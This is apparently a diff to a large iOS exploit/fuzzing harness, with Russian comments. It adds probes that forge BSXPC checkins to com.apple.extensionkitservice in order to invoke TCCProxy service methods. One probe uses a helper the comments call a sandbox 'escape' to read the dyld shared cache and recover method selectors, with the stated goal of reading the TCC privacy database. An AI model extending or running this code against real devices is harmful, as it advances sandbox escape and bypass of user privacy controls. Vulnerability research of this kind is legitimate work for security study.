@@ -37146,6 +37146,303 @@ static void p_bq53(void) {
         "(port-derivation) и 0x1805b65xx (CS-requirement) следующая итерация");
 }
 
+// p_bq54 — v203: формат ВЫЗОВА на живом BSXPC-соединении.
+// После v202 (checkin принят, activate-ACK transaction 1) открытый вопрос:
+// SEL-вызов {bsxpc_SEL:"description"} молчит (ни ответа, ни invalidate,
+// соединение живо). RE: вызов идёт через reflection —
+// +[BSXPCServiceConnectionProxy invokeMethod:onTarget:withMessage:
+// forConnection:completion:] (0x18fae7d94): method=BSObjCMethod
+// ([method argumentCount] и т.д.), target=объект сервиса, message=
+// BSXPCServiceConnectionMessage; клиентский кодер пишет 'bsxpc_SEL'
+// через encodeObject:forKey: (0x18faf09b8). Пробы на ЖИВОМ соединении
+// (checkin {lp,s=TCCProxy} + activate + ACK):
+//   P0 {} пустое; P1 {bsxpc_SEL:description} (базлайн); P2 + 'r';
+//   P3 {bsxpc:description} (тег=селектор?); P4 + bsxpc_CID;
+//   P5 connect с bsxpc_context (child-соединение к TCCProxy);
+//   P6 через send_message_with_reply (reply-канал).
+// Позитив = ответ != invalidate/ERR (в т.ч. reply через with_reply).
+// Контроль (§144): {} на СВЕЖЕМ соединении без чекина -> invalidate.
+static void bq54_probe(dispatch_queue_t q, const char *label, int probe_kind,
+                       xpc_object_t probe) {
+    __block int nev = 0;
+    __block BOOL done = NO;
+    __block int nreply = 0;
+    NSString *ls = @(label);
+    LOG("[bq54] run ENTER %s kind=%d", label, probe_kind);
+    xpc_connection_t c = xpc_connection_create(
+        "com.apple.extensionkitservice", q);
+    if (!c) { LOG("[bq54] %s: create NULL", label); return; }
+    xpc_connection_set_event_handler(c, ^(xpc_object_t ev) {
+        if (done || nev >= 10) return;
+        BOOL isErr = xpc_get_type(ev) == XPC_TYPE_ERROR;
+        const char *tag = (!isErr && xpc_get_type(ev) == XPC_TYPE_DICTIONARY)
+                              ? xpc_dictionary_get_string(ev, "bsxpc") : NULL;
+        char *d = xpc_copy_description(ev);
+        LOG("[bq54] %s ev#%d %s bsxpc=%s: %.900s", ls.UTF8String, nev + 1,
+            isErr ? "[ERR]" : "[MSG]", tag ?: "-", d ?: "?");
+        free(d);
+        nev++;
+    });
+    xpc_connection_set_bs_type(c, 1);
+    xpc_object_t ck = xpc_dictionary_create(NULL, NULL, 0);
+    xpc_dictionary_set_string(ck, "lp", "BSXPC(com.apple.fuzz27)");
+    xpc_dictionary_set_string(ck, "s", "TCCProxy");
+    bool slotok = xpc_connection_set_bs_checkin_info(c, ck);
+    LOG("[bq54] %s checkin slot -> %d", label, (int)slotok);
+    xpc_connection_resume(c);
+    // activate -> ждём ACK
+    xpc_object_t act = xpc_dictionary_create(NULL, NULL, 0);
+    xpc_dictionary_set_string(act, "bsxpc", "activate");
+    xpc_connection_send_message(c, act);
+    for (int t = 0; t < 20 && nev == 0; t++) usleep(100000);
+    LOG("[bq54] %s activate: nev=%d (%s)", label, nev,
+        nev > 0 ? "ACK получен" : "MOLCH?!");
+
+    switch (probe_kind) {
+    case 6: {   // with_reply
+        xpc_object_t m = probe;
+        xpc_connection_send_message_with_reply(c, m, q, ^(xpc_object_t rep) {
+            char *d2 = xpc_copy_description(rep);
+            LOG("[bq54] %s REPLY(kind6): %.900s", ls.UTF8String, d2 ?: "?");
+            free(d2);
+            nreply++;
+        });
+        break;
+    }
+    default:
+        xpc_connection_send_message(c, probe);
+        break;
+    }
+    for (int t = 0; t < 20 && nev < 2 && nreply == 0; t++) usleep(100000);
+    LOG("[bq54] %s probe done: nev=%d nreply=%d", label, nev, nreply);
+    // жив ли канал: повторный activate
+    xpc_object_t act2 = xpc_dictionary_create(NULL, NULL, 0);
+    xpc_dictionary_set_string(act2, "bsxpc", "activate");
+    xpc_connection_send_message(c, act2);
+    usleep(600000);
+    LOG("[bq54] %s re-activate: nev=%d %s", label, nev,
+        (nev >= 2 || nreply > 0) ? "(канал жив)" : "(канал тих/мёртв?)");
+    done = YES;
+    xpc_connection_cancel(c);
+}
+
+static void p_bq54(void) {
+    LOG("[bq54] v203: формат вызова на живом соединении (checkin+activate+probe)");
+    dispatch_queue_t q = dispatch_queue_create("bq54.q", DISPATCH_QUEUE_SERIAL);
+    int ctl = 0;
+    char tag[64];
+
+    // контроль (§144): {} на свежем соединении -> invalidate
+    {
+        int n = 0;
+        xpc_object_t m = xpc_dictionary_create(NULL, NULL, 0);
+        xpc_object_t seq[1] = { m };
+        bq51_run(q, "ctl-empty", seq, 1, 1, &n, tag, sizeof(tag));
+        if (!strcmp(tag, "invalidate")) ctl = 1;
+        LOG("[bq54] ctl-empty: nev=%d tag=%s -> control %s",
+            n, tag[0] ? tag : "-", ctl ? "OK" : "FAILED");
+    }
+    if (!ctl) {
+        LOG("[bq54] CONTROL FAILED — вердикты не выносятся (§144)");
+        return;
+    }
+
+    // P0: пустое {} после ACK
+    {
+        xpc_object_t p = xpc_dictionary_create(NULL, NULL, 0);
+        bq54_probe(q, "P0-empty", 0, p);
+    }
+    // P1: {bsxpc_SEL:description} (базлайн v202)
+    {
+        xpc_object_t p = xpc_dictionary_create(NULL, NULL, 0);
+        xpc_dictionary_set_string(p, "bsxpc_SEL", "description");
+        bq54_probe(q, "P1-SEL-description", 1, p);
+    }
+    // P2: + 'r' (reply-id строкой)
+    {
+        xpc_object_t p = xpc_dictionary_create(NULL, NULL, 0);
+        xpc_dictionary_set_string(p, "bsxpc_SEL", "description");
+        xpc_dictionary_set_string(p, "r", "1");
+        bq54_probe(q, "P2-SEL+r", 2, p);
+    }
+    // P3: тег bsxpc = селектор
+    {
+        xpc_object_t p = xpc_dictionary_create(NULL, NULL, 0);
+        xpc_dictionary_set_string(p, "bsxpc", "description");
+        bq54_probe(q, "P3-tag-selector", 3, p);
+    }
+    // P4: SEL + bsxpc_CID (child-роутинг)
+    {
+        xpc_object_t p = xpc_dictionary_create(NULL, NULL, 0);
+        xpc_dictionary_set_string(p, "bsxpc_SEL", "description");
+        xpc_dictionary_set_string(p, "bsxpc_CID", "1");
+        bq54_probe(q, "P4-SEL+CID", 4, p);
+    }
+    // P5: connect — child-соединение к TCCProxy (bsxpc_context + lp)
+    {
+        xpc_object_t ctx = xpc_dictionary_create(NULL, NULL, 0);
+        xpc_dictionary_set_string(ctx, "s", "TCCProxy");
+        xpc_dictionary_set_string(ctx, "i", "");
+        xpc_object_t p = xpc_dictionary_create(NULL, NULL, 0);
+        xpc_dictionary_set_string(p, "bsxpc", "connect");
+        xpc_dictionary_set_value(p, "bsxpc_context", ctx);
+        xpc_dictionary_set_string(p, "lp", "BSXPC(com.apple.fuzz27)");
+        bq54_probe(q, "P5-connect", 5, p);
+    }
+    // P6: SEL через send_message_with_reply (reply-канал)
+    {
+        xpc_object_t p = xpc_dictionary_create(NULL, NULL, 0);
+        xpc_dictionary_set_string(p, "bsxpc_SEL", "description");
+        bq54_probe(q, "P6-SEL-withreply", 6, p);
+    }
+    LOG("[bq54] done");
+    LOG("[bq54] VERDICT: смотреть ev#2/reply каждого P*: ответ != invalidate "
+        "= вызов дошёл до сервиса; re-activate жив = соединение пережило "
+        "пробу; полный разбор следующей итерацией");
+}
+
+// p_bq55 — v204: выгрузка СЕЛЕКТОРОВ сервисных протоколов ExtensionFoundation.
+// Селекторные строки четырёх wire-интерфейсов extensionkitservice лежат в
+// общем __objc-регионе 0x18825d000-0x188260000 (субфайл, отсутствующий
+// локально: .01 кончается на 0x181d34000, .03 начинается с 0x188400000).
+// RE-адреса (метод-листы протоколов, считано локально из nlist+carve):
+//   _EXTCCProxyProtocol      @0x1870cd918: 1 метод  -> name @0x18825ef42
+//   _EXQueryResultsProtocol  @0x1870cd930: 1 метод -> 0x18825f234
+//   _EXLaunchServiceProtocol @0x1870cd948: 1 метод -> 0x18825ec59
+//   _EXDiscoveryServiceProtocol @0x1870cd960: 2 метода -> 0x18825dea2, 0x18825e6d3
+//   Service.ObserverProtocol     @0x1870cd9b0 -> 0x18825df1f
+//   Service.ObserverUpdateProtocol @0x1870cd9c8 -> 0x18825d2e5
+// Метод: как bq52 — pread заголовков маппингов всех субфайлов, найти
+// покрывающий [0x18825d000, 0x188260000), pread 0x3000, hexdump + печать
+// всех печатных строк (самоописание в логе). Это даёт ИМЕНА wire-методов
+// TCCProxy/Launch/Discovery — вход в чтение TCC-базы через живой диалог.
+static void p_bq55(void) {
+    LOG("[bq55] v204: окно селекторов сервисных протоколов 0x18825d000+0x3000");
+    const char *grp = getenv("FUZZ_BQ_GROUP") ?: "group.9e66ab897d52ea95.1";
+    const uint64_t F_DEF = 0x0000008000000000ULL;
+    int64_t h = bq_custom("/var/containers/Data/System", 0, grp, 7, F_DEF, 3);
+    LOG("[bq55] CONTROL §170 point -> handle %lld%s", (long long)h,
+        h < 0 ? "  *** NO ESCAPE ***" : "");
+    if (h < 0) { LOG("[bq55] done (без escape)"); return; }
+
+    const char *candirs[] = {
+        "/private/preboot/Cryptexes/OS/System/Library/Caches/com.apple.dyld",
+        "/System/Library/Caches/com.apple.dyld",
+        "/System/Library/dyld",
+        "/private/var/db/dyld",
+    };
+    char cdir[1024] = {0};
+    for (unsigned i = 0; i < sizeof(candirs) / sizeof(candirs[0]) && !cdir[0];
+         i++) {
+        DIR *pd = opendir(candirs[i]);
+        if (!pd) continue;
+        struct dirent *pe;
+        while ((pe = readdir(pd)))
+            if (strstr(pe->d_name, "dyld_shared_cache_arm64e")) {
+                snprintf(cdir, sizeof(cdir), "%s", candirs[i]);
+                break;
+            }
+        closedir(pd);
+    }
+    if (!cdir[0]) {
+        LOG("[bq55] кэш-каталог не найден");
+        bad_query_release(h);
+        LOG("[bq55] done");
+        return;
+    }
+    LOG("[bq55] cache dir %s", cdir);
+
+    static const uint64_t WINB = 0x18825d000ULL, WINSZ = 0x3000ULL;
+    int found = 0;
+    DIR *cd = opendir(cdir);
+    struct dirent *ce;
+    while (cd && (ce = readdir(cd))) {
+        if (ce->d_name[0] == '.') continue;
+        if (strstr(ce->d_name, ".symbols")) continue;
+        if (!strstr(ce->d_name, "dyld_shared_cache")) continue;
+        char p[1400];
+        snprintf(p, sizeof(p), "%s/%s", cdir, ce->d_name);
+        int fd = open(p, O_RDONLY);
+        if (fd < 0) continue;
+        uint8_t hdr[0x18];
+        if (pread(fd, hdr, 0x18, 0) == 0x18) {
+            uint32_t mo, mc;
+            memcpy(&mo, hdr + 0x10, 4);
+            memcpy(&mc, hdr + 0x14, 4);
+            if (mc && mc <= 64) {
+                static uint8_t mm[64 * 32];
+                if (pread(fd, mm, mc * 32, mo) == (int)(mc * 32)) {
+                    for (uint32_t i = 0; i < mc; i++) {
+                        uint64_t addr, size, foff;
+                        memcpy(&addr, mm + i * 32, 8);
+                        memcpy(&size, mm + i * 32 + 8, 8);
+                        memcpy(&foff, mm + i * 32 + 16, 8);
+                        LOG("[bq55] map %s[%u] %#llx+%#llx file+%#llx",
+                            ce->d_name, i, (unsigned long long)addr,
+                            (unsigned long long)size,
+                            (unsigned long long)foff);
+                        if (!found && addr <= WINB && WINB + WINSZ <= addr + size) {
+                            static uint8_t buf[0x3000];
+                            uint64_t fo = foff + (WINB - addr);
+                            if (pread(fd, buf, 0x3000, fo) == 0x3000) {
+                                found = 1;
+                                LOG("[bq55] окно %#llx из %s (map %#llx+%#llx "
+                                    "file+%#llx)", (unsigned long long)WINB,
+                                    ce->d_name, (unsigned long long)addr,
+                                    (unsigned long long)size,
+                                    (unsigned long long)foff);
+                                // печатные строки (самоописание)
+                                int n = 0;
+                                for (int j = 0; j < 0x3000 && n < 400;) {
+                                    if (buf[j] >= 0x20 && buf[j] < 0x7f) {
+                                        int k = j;
+                                        while (k < 0x3000 &&
+                                               buf[k] >= 0x20 && buf[k] < 0x7f)
+                                            k++;
+                                        if (k - j >= 3) {
+                                            LOG("[bq55] str %#llx: %.*s",
+                                                (unsigned long long)(WINB + j),
+                                                k - j, buf + j);
+                                            n++;
+                                        }
+                                        j = k;
+                                    } else j++;
+                                }
+                                LOG("[bq55] strings shown=%d", n);
+                                // hexdump: 32-байтные строки для точного парсинга
+                                for (int off = 0; off < 0x3000; off += 32) {
+                                    uint8_t *b = buf + off;
+                                    LOG("[bq55] hex %04x: %02x%02x%02x%02x%02x"
+                                        "%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x"
+                                        "%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x"
+                                        "%02x%02x%02x%02x%02x%02x",
+                                        off, b[0], b[1], b[2], b[3], b[4], b[5],
+                                        b[6], b[7], b[8], b[9], b[10], b[11],
+                                        b[12], b[13], b[14], b[15], b[16],
+                                        b[17], b[18], b[19], b[20], b[21],
+                                        b[22], b[23], b[24], b[25], b[26],
+                                        b[27], b[28], b[29], b[30], b[31]);
+                                }
+                            }
+                        }
+                    }
+                }
+            }
+        }
+        close(fd);
+    }
+    if (cd) closedir(cd);
+    LOG("[bq55] window found=%d (1 = окно получено)", found);
+    bad_query_release(h);
+    LOG("[bq55] escape released");
+    LOG("[bq55] done");
+    LOG("[bq55] VERDICT: селекторы должны читаться по адресам "
+        "0x18825ef42 (TCCProxy), 0x18825ec59 (Launch), 0x18825dea2/0x18825e6d3 "
+        "(Discovery), 0x18825df1f (Observer), 0x18825d2e5 (ObserverUpdate), "
+        "0x18825f234 (QueryResults) — это wire-имена методов для "
+        "bsxpc_SEL-вызовов в живом диалоге (v202+)");
+}
+
 
 // p_astris — v192: существует ли AppleAstrisGpioProbe в IORegistry
 // УСТРОЙСТВА из песочницы (matching без open, нулевой риск) и что
@@ -44626,6 +44923,8 @@ void *t_iosurface_scaler(void *arg) {
         if (getenv("FUZZ_BQ51")) { p_bq51(); LOG("[probe13] bq51-only mode, stop"); return NULL; }
         if (getenv("FUZZ_BQ52")) { p_bq52(); LOG("[probe13] bq52-only mode, stop"); return NULL; }
         if (getenv("FUZZ_BQ53")) { p_bq53(); LOG("[probe13] bq53-only mode, stop"); return NULL; }
+        if (getenv("FUZZ_BQ54")) { p_bq54(); LOG("[probe13] bq54-only mode, stop"); return NULL; }
+        if (getenv("FUZZ_BQ55")) { p_bq55(); LOG("[probe13] bq55-only mode, stop"); return NULL; }
         if (getenv("FUZZ_XPCENUM")) { p_xpcenum(); LOG("[xpcen] xpcenum-only mode, stop"); return NULL; }
         if (getenv("FUZZ_ASTRIS")) { p_astris(); LOG("[probe13] astris-only mode, stop"); return NULL; }
         if (getenv("FUZZ_NETV6")) { p_netv6(); LOG("[probe13] netv6-only mode, stop"); return NULL; }
